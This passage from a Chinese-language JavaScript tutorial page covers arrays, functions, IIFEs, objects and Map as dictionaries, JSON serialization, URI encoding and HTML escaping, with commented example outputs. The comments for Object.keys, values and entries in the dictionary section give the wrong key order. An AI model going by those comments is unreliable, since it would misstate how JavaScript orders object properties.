class="line"><span class="keyword">var</span> slice = numbers.<span class="title function_">slice</span>(<span class="number">1</span>, <span class="number">3</span>); <span class="comment">// [2,3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 排序</span></span><br><span class="line"><span class="keyword">var</span> unsorted = [<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>];</span><br><span class="line">unsorted.<span class="title function_">sort</span>(<span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(unsorted); <span class="comment">// [1,2,3,4]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接数组</span></span><br><span class="line"><span class="keyword">var</span> combined = numbers.<span class="title function_">concat</span>([<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转换为字符串</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(numbers.<span class="title function_">join</span>(<span class="string">&quot;, &quot;</span>)); <span class="comment">// &quot;1, 2, 3, 4, 5&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 高阶函数</span></span><br><span class="line"><span class="keyword">var</span> doubled = numbers.<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">num</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> num * <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> even = numbers.<span class="title function_">filter</span>(<span class="keyword">function</span>(<span class="params">num</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> num % <span class="number">2</span> === <span class="number">0</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sum = numbers.<span class="title function_">reduce</span>(<span class="keyword">function</span>(<span class="params">acc, num</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> acc + num;</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<h2 id="9-函数"><a href="#9-函数" class="headerlink" title="9. 函数"></a>9. 函数</h2><h3 id="9-1-函数定义与调用"><a href="#9-1-函数定义与调用" class="headerlink" title="9.1 函数定义与调用"></a>9.1 函数定义与调用</h3><p><strong>详细解释：</strong></p>
<ul>
<li><strong>函数声明</strong>：使用<code>function</code>关键字定义</li>
<li><strong>函数表达式</strong>：将函数赋值给变量</li>
<li><strong>调用</strong>：使用函数名加括号，可传递参数</li>
<li><strong>返回值</strong>：使用<code>return</code>语句，未返回则默认返回<code>undefined</code></li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数表达式</span></span><br><span class="line"><span class="keyword">var</span> subtract = <span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用函数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">5</span>, <span class="number">3</span>)); <span class="comment">// 8</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">subtract</span>(<span class="number">5</span>, <span class="number">3</span>)); <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 带默认参数的函数（ES6+）</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">multiply</span>(<span class="params">a, b = <span class="number">1</span></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">multiply</span>(<span class="number">5</span>)); <span class="comment">// 5</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">multiply</span>(<span class="number">5</span>, <span class="number">2</span>)); <span class="comment">// 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 剩余参数（ES6+）</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">...numbers</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> numbers.<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, num</span>) =&gt;</span> acc + num, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sum</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)); <span class="comment">// 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 展开运算符（ES6+）</span></span><br><span class="line"><span class="keyword">var</span> nums = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sum</span>(...nums)); <span class="comment">// 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数作为参数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">operate</span>(<span class="params">a, b, operation</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">operation</span>(a, b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">operate</span>(<span class="number">5</span>, <span class="number">3</span>, add)); <span class="comment">// 8</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">operate</span>(<span class="number">5</span>, <span class="number">3</span>, subtract)); <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自调用函数表达式（IIFE）</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;这个函数立即执行&quot;</span>);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带参数的IIFE</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;你好，&quot;</span> + name + <span class="string">&quot;！&quot;</span>);</span><br><span class="line">&#125;)(<span class="string">&quot;张三&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="9-2-匿名函数"><a href="#9-2-匿名函数" class="headerlink" title="9.2 匿名函数"></a>9.2 匿名函数</h3><p><strong>详细解释：</strong></p>
<ul>
<li>没有函数名的函数</li>
<li>通常作为回调函数使用</li>
<li>用于创建立即执行函数表达式（IIFE）</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 作为回调函数</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;btn&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;按钮被点击&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 作为定时器回调</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;2秒后执行&quot;</span>);</span><br><span class="line">&#125;, <span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 作为数组方法的参数</span></span><br><span class="line"><span class="keyword">var</span> numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">var</span> doubled = numbers.<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">num</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> num * <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匿名函数赋值给变量</span></span><br><span class="line"><span class="keyword">var</span> greet = <span class="keyword">function</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;你好，&quot;</span> + name + <span class="string">&quot;！&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">greet</span>(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// IIFE（立即执行函数表达式）</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> privateVar = <span class="string">&quot;私有变量&quot;</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;IIFE执行&quot;</span>);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带参数的IIFE</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;你好，&quot;</span> + name);</span><br><span class="line">&#125;)(<span class="string">&quot;王五&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 作为返回值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createMultiplier</span>(<span class="params">factor</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">number</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> number * factor;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> double = <span class="title function_">createMultiplier</span>(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> triple = <span class="title function_">createMultiplier</span>(<span class="number">3</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">double</span>(<span class="number">5</span>)); <span class="comment">// 10</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">triple</span>(<span class="number">5</span>)); <span class="comment">// 15</span></span><br></pre></td></tr></table></figure>

<h2 id="10-字典（对象作为字典使用）"><a href="#10-字典（对象作为字典使用）" class="headerlink" title="10. 字典（对象作为字典使用）"></a>10. 字典（对象作为字典使用）</h2><p><strong>详细解释：</strong></p>
<ul>
<li>JavaScript中没有专门的”字典”类型</li>
<li>通常使用对象来模拟字典（键值对存储）</li>
<li>键必须是字符串或Symbol类型</li>
<li>通过属性访问或<code>Object.keys()</code>等方法遍历</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建字典</span></span><br><span class="line"><span class="keyword">var</span> dictionary = &#123;</span><br><span class="line">    <span class="string">&quot;apple&quot;</span>: <span class="string">&quot;苹果&quot;</span>,</span><br><span class="line">    <span class="string">&quot;banana&quot;</span>: <span class="string">&quot;香蕉&quot;</span>,</span><br><span class="line">    <span class="string">&quot;orange&quot;</span>: <span class="string">&quot;橙子&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dictionary.<span class="property">apple</span>); <span class="comment">// &quot;苹果&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dictionary[<span class="string">&quot;banana&quot;</span>]); <span class="comment">// &quot;香蕉&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加新项</span></span><br><span class="line">dictionary.<span class="property">grape</span> = <span class="string">&quot;葡萄&quot;</span>;</span><br><span class="line">dictionary[<span class="string">&quot;mango&quot;</span>] = <span class="string">&quot;芒果&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改值</span></span><br><span class="line">dictionary.<span class="property">apple</span> = <span class="string">&quot;红苹果&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除项</span></span><br><span class="line"><span class="keyword">delete</span> dictionary.<span class="property">orange</span>;</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line"><span class="keyword">delete</span> dictionary[<span class="string">&quot;banana&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查键是否存在</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;apple&quot;</span> <span class="keyword">in</span> dictionary); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dictionary.<span class="title function_">hasOwnProperty</span>(<span class="string">&quot;banana&quot;</span>)); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历字典</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> dictionary) &#123;</span><br><span class="line">    <span class="keyword">if</span> (dictionary.<span class="title function_">hasOwnProperty</span>(key)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(key + <span class="string">&quot;: &quot;</span> + dictionary[key]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取所有键</span></span><br><span class="line"><span class="keyword">var</span> keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(dictionary);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(keys); <span class="comment">// [&quot;grape&quot;, &quot;mango&quot;, &quot;apple&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取所有值</span></span><br><span class="line"><span class="keyword">var</span> values = <span class="title class_">Object</span>.<span class="title function_">values</span>(dictionary);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(values); <span class="comment">// [&quot;葡萄&quot;, &quot;芒果&quot;, &quot;红苹果&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取键值对数组</span></span><br><span class="line"><span class="keyword">var</span> entries = <span class="title class_">Object</span>.<span class="title function_">entries</span>(dictionary);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(entries); <span class="comment">// [[&quot;grape&quot;, &quot;葡萄&quot;], [&quot;mango&quot;, &quot;芒果&quot;], [&quot;apple&quot;, &quot;红苹果&quot;]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用Map（ES6+，更强大的字典结构）</span></span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;苹果&quot;</span>);</span><br><span class="line">map.<span class="title function_">set</span>(<span class="string">&quot;banana&quot;</span>, <span class="string">&quot;香蕉&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="title function_">get</span>(<span class="string">&quot;apple&quot;</span>)); <span class="comment">// &quot;苹果&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="title function_">has</span>(<span class="string">&quot;banana&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">map.<span class="title function_">delete</span>(<span class="string">&quot;banana&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历Map</span></span><br><span class="line">map.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">value, key</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(key + <span class="string">&quot;: &quot;</span> + value);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> [key, value] <span class="keyword">of</span> map) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(key + <span class="string">&quot;: &quot;</span> + value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="11-JavaScript序列化与反序列化"><a href="#11-JavaScript序列化与反序列化" class="headerlink" title="11. JavaScript序列化与反序列化"></a>11. JavaScript序列化与反序列化</h2><p><strong>详细解释：</strong></p>
<ul>
<li><strong>序列化</strong>：将JavaScript对象转换为字符串</li>
<li><strong>反序列化</strong>：将字符串转换回JavaScript对象</li>
<li>主要使用<code>JSON</code>对象的<code>stringify</code>和<code>parse</code>方法</li>
<li>JSON（JavaScript Object Notation）是一种轻量级数据交换格式</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建对象</span></span><br><span class="line"><span class="keyword">var</span> user = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">25</span>,</span><br><span class="line">    <span class="attr">address</span>: &#123;</span><br><span class="line">        <span class="attr">city</span>: <span class="string">&quot;北京&quot;</span>,</span><br><span class="line">        <span class="attr">street</span>: <span class="string">&quot;中关村&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">hobbies</span>: [<span class="string">&quot;编程&quot;</span>, <span class="string">&quot;阅读&quot;</span>, <span class="string">&quot;运动&quot;</span>]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化为JSON字符串</span></span><br><span class="line"><span class="keyword">var</span> jsonString = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(jsonString);</span><br><span class="line"><span class="comment">// &#123;&quot;name&quot;:&quot;张三&quot;,&quot;age&quot;:25,&quot;address&quot;:&#123;&quot;city&quot;:&quot;北京&quot;,&quot;street&quot;:&quot;中关村&quot;&#125;,&quot;hobbies&quot;:[&quot;编程&quot;,&quot;阅读&quot;,&quot;运动&quot;]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化时格式化输出</span></span><br><span class="line"><span class="keyword">var</span> formattedJson = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(formattedJson);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &quot;name&quot;: &quot;张三&quot;,</span></span><br><span class="line"><span class="comment">  &quot;age&quot;: 25,</span></span><br><span class="line"><span class="comment">  &quot;address&quot;: &#123;</span></span><br><span class="line"><span class="comment">    &quot;city&quot;: &quot;北京&quot;,</span></span><br><span class="line"><span class="comment">    &quot;street&quot;: &quot;中关村&quot;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  &quot;hobbies&quot;: [</span></span><br><span class="line"><span class="comment">    &quot;编程&quot;,</span></span><br><span class="line"><span class="comment">    &quot;阅读&quot;,</span></span><br><span class="line"><span class="comment">    &quot;运动&quot;</span></span><br><span class="line"><span class="comment">  ]</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化时过滤属性</span></span><br><span class="line"><span class="keyword">var</span> filteredJson = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user, [<span class="string">&quot;name&quot;</span>, <span class="string">&quot;age&quot;</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(filteredJson); <span class="comment">// &#123;&quot;name&quot;:&quot;张三&quot;,&quot;age&quot;:25&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义序列化</span></span><br><span class="line"><span class="keyword">var</span> customJson = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user, <span class="keyword">function</span>(<span class="params">key, value</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (key === <span class="string">&quot;age&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> value + <span class="string">&quot;岁&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(customJson); <span class="comment">// &#123;&quot;name&quot;:&quot;张三&quot;,&quot;age&quot;:&quot;25岁&quot;,...&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line"><span class="keyword">var</span> parsedUser = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(jsonString);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(parsedUser.<span class="property">name</span>); <span class="comment">// &quot;张三&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(parsedUser.<span class="property">address</span>.<span class="property">city</span>); <span class="comment">// &quot;北京&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化时转换值</span></span><br><span class="line"><span class="keyword">var</span> transformedUser = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(jsonString, <span class="keyword">function</span>(<span class="params">key, value</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (key === <span class="string">&quot;age&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> value + <span class="string">&quot;岁&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(transformedUser.<span class="property">age</span>); <span class="comment">// &quot;25岁&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化函数</span></span><br><span class="line"><span class="keyword">var</span> objWithFunction = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;测试&quot;</span>,</span><br><span class="line">    <span class="attr">func</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(objWithFunction)); </span><br><span class="line"><span class="comment">// &#123;&quot;name&quot;:&quot;测试&quot;&#125; - 函数被忽略</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化日期对象</span></span><br><span class="line"><span class="keyword">var</span> objWithDate = &#123;</span><br><span class="line">    <span class="attr">date</span>: <span class="keyword">new</span> <span class="title class_">Date</span>()</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(objWithDate)); </span><br><span class="line"><span class="comment">// &#123;&quot;date&quot;:&quot;2023-10-15T08:30:00.000Z&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义日期序列化</span></span><br><span class="line"><span class="keyword">var</span> customDateJson = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(objWithDate, <span class="keyword">function</span>(<span class="params">key, value</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (value <span class="keyword">instanceof</span> <span class="title class_">Date</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> value.<span class="title function_">toISOString</span>().<span class="title function_">split</span>(<span class="string">&#x27;T&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(customDateJson); <span class="comment">// &#123;&quot;date&quot;:&quot;2023-10-15&quot;&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="12-转义与编码"><a href="#12-转义与编码" class="headerlink" title="12. 转义与编码"></a>12. 转义与编码</h2><p><strong>详细解释：</strong></p>
<ul>
<li><strong>转义</strong>：将特殊字符转换为安全表示形式</li>
<li><strong>URL编码</strong>：将URL中的特殊字符转换为%xx格式</li>
<li>常用方法：<ul>
<li><code>encodeURI()</code>：编码整个URI</li>
<li><code>encodeURIComponent()</code>：编码URI的组件</li>
<li><code>decodeURI()</code>：解码URI</li>
<li><code>decodeURIComponent()</code>：解码URI组件</li>
</ul>
</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// URI编码</span></span><br><span class="line"><span class="keyword">var</span> uri = <span class="string">&quot;https://example.com/search?q=JavaScript 基础&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">encodeURI</span>(uri)); </span><br><span class="line"><span class="comment">// &quot;https://example.com/search?q=JavaScript%20%E5%9F%BA%E7%A1%80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> component = <span class="string">&quot;JavaScript 基础&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">encodeURIComponent</span>(component)); </span><br><span class="line"><span class="comment">// &quot;JavaScript%20%E5%9F%BA%E7%A1%80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// URI解码</span></span><br><span class="line"><span class="keyword">var</span> encodedUri = <span class="string">&quot;https://example.com/search?q=JavaScript%20%E5%9F%BA%E7%A1%80&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">decodeURI</span>(encodedUri)); </span><br><span class="line"><span class="comment">// &quot;https://example.com/search?q=JavaScript 基础&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> encodedComponent = <span class="string">&quot;JavaScript%20%E5%9F%BA%E7%A1%80&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">decodeURIComponent</span>(encodedComponent)); </span><br><span class="line"><span class="comment">// &quot;JavaScript 基础&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 转义HTML特殊字符</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> str.<span class="title function_">replace</span>(<span class="regexp">/[&amp;&lt;&gt;&quot;&#x27;]/g</span>, <span class="keyword">function</span>(<span class="params">match</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> escapeMap = &#123;</span><br><span class="line">            <span class="string">&#x27;&amp;&#x27;</span>: <span class="string">&#x27;&amp;amp;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;&lt;&#x27;</span>: <span class="string">&#x27;&amp;lt;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;&gt;&#x27;</span>: <span class="string">&#x27;&amp;gt;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;&quot;&#x27;</span>: <span class="string">&#x27;&amp;quot;&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;&#x27;&quot;</span>: <span class="string">&#x27;&amp;#39;&#x27;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> escapeMap[match];</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">escapeHtml</span>(<span class="string">&#x27;&lt;div class=&quot;test&quot;&gt;Hello &amp; World&lt;/div&gt;&#x27;</span>));</span><br><span class="line"><span class="comment">// &quot;&amp;lt;div class=&amp;quot;test&amp;quot;&amp;gt;Hello &amp;amp; World&amp;lt;/div&amp;gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 反转义HTML特殊字符</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">unescapeHtml</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> htmlEntities = &#123;</span><br><span class="line">        <span class="string">&#x27;&amp;amp;&#x27;</span>: <span class="string">&#x27;&amp;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&amp;lt;&#x27;</span>: <span class="string">&#x27;&lt;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&amp;gt;&#x27;</span>: <span class="string">&#x27;&gt;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&amp;quot;&#x27;</span>: <span class="string">&#x27;&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&amp;#39;&#x27;</span>: <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> str.<span class="title function_">replace</span>(<span class="regexp">/&amp;(#?)(\w+);/g</span>, <span class="keyword">function</span>(<span class="params">match, hash, name</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> htmlEntities[match] || match;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">unescapeHtml</span>(<span class="string">&quot;&amp;lt;div class=&amp;quot;test&amp;quot;&amp;gt;Hello &amp;amp; World&amp;lt;/div&amp;gt;&quot;</span>));</span><br><span class="line"><span class="comment">// &quot;&lt;div class=&quot;test&quot;&gt;Hello &amp; World&lt;/div&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Base64编码与解码</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;Hello, JavaScript!&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> base64 = <span class="title function_">btoa</span>(str);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title 